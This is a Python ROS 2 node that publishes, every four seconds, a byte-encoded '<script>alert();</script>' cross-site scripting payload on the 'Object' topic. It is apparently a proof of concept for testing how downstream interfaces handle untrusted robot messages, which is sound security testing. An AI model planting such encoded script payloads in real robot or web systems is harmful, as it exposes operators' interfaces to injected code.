import rclpy
from rclpy.node import Node
from std_msgs.msg import UInt8MultiArray


class ObjectPublisher(Node):
    def __init__(self):
        super().__init__('object_publisher')
        self.publisher = self.create_publisher(UInt8MultiArray, 'Object', 10)
        timer_period = 4
        self.timer = self.create_timer(timer_period, self.callback)

    def callback(self):
        # Generate message
        msg = UInt8MultiArray()

        # Modify data field with the payload
        msg.data = [60, 115, 99, 114, 105, 112, 116, 62, 97, 108, 101,
                    114, 116, 40, 41, 59, 60, 47, 115, 99, 114, 105, 112,
                    116, 62]  # Payload -> <script>alert();</script>

        self.publisher.publish(msg)
        self.get_logger().info('Publishing object data')


def main():
    rclpy.init()
    object_publisher = ObjectPublisher()
    try:
        rclpy.spin(object_publisher)
    except KeyboardInterrupt:
        pass
    finally:
        object_publisher.destroy_node()
        rclpy.try_shutdown()


if __name__ == '__main__':
    main()
